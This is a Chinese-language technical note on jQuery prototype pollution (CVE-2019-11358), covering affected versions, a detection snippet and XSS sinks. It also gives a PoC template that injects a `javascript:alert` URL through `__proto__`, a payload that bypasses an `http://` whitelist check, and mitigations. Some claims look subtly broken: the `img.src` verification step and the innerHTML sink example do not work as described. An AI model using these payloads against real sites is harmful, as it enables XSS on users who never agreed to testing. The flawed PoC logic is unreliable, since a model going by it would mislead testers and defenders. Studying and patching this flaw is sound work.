# jQuery原型污染 (CVE-2019-11358)

## 漏洞原理

jQuery < 3.4.0 的 `jQuery.extend(true, target, source)` 在深度合并时，
会递归处理 `__proto__` 属性，导致 `Object.prototype` 被污染。

## 影响版本

- jQuery 1.x 全部受影响
- jQuery 2.x 全部受影响  
- jQuery 3.0.0 - 3.3.1 受影响
- jQuery 3.4.0+ 已修复

## 检测方法

```javascript
// 1. 检查jQuery版本
console.log(jQuery.fn.jquery);

// 2. 测试原型污染
const malicious = JSON.parse('{"__proto__":{"__poc_test":"POLLUTED"}}');
jQuery.extend(true, {}, malicious);

const testObj = {};
console.log(testObj.__poc_test); // "POLLUTED" = 漏洞存在

// 3. 清理
delete Object.prototype.__poc_test;
```

## 升级为XSS的条件

原型污染本身不是XSS，需要一个"sink"把污染的属性用于危险操作:

### 常见Sink

1. **innerHTML / v-html**
```javascript
// 如果页面中有:
element.innerHTML = userInput;
// 污染 innerHTML 属性即可XSS
```

2. **document.write**
```javascript
// 如果页面中有:
document.write('<img src="' + obj.src + '">');
// 污染 src 属性即可XSS
```

3. **Vue自定义指令**
```javascript
// v-html 指令使用innerHTML
// v-src-html 自定义指令（常见于中文站点）
```

4. **jQuery .html() / .attr()**
```javascript
$('#el').html(obj.content);  // 污染 content
$('#el').attr('src', obj.src); // 污染 src
```

## 实战PoC模板

```javascript
// 完整PoC: 原型污染 → DOM影响验证
(function() {
  // Step 1: 污染
  const payload = JSON.parse('{"__proto__":{"src":"javascript:alert(document.domain)"}}');
  jQuery.extend(true, {}, payload);
  
  // Step 2: 验证DOM影响
  const img = document.createElement('img');
  console.log('img.src:', img.src);
  // 如果输出 "javascript:alert(document.domain)" → 可利用
  
  // Step 3: 清理
  delete Object.prototype.src;
})();
```

## document.write协议绕过

如果代码有协议白名单检查:

```javascript
// 目标代码
if(url.includes("http://") || url.includes("https://"))
  document.write('<a href="' + url + '">');

// 绕过payload
"javascript:alert(1)//http://"
// 包含 "http://" 通过检查
// 浏览器执行 javascript: 协议
```

## 参考

- CVE: https://nvd.nist.gov/vuln/detail/CVE-2019-11358
- 修复: 升级jQuery到3.4.0+
- 临时缓解: `Object.freeze(Object.prototype)`
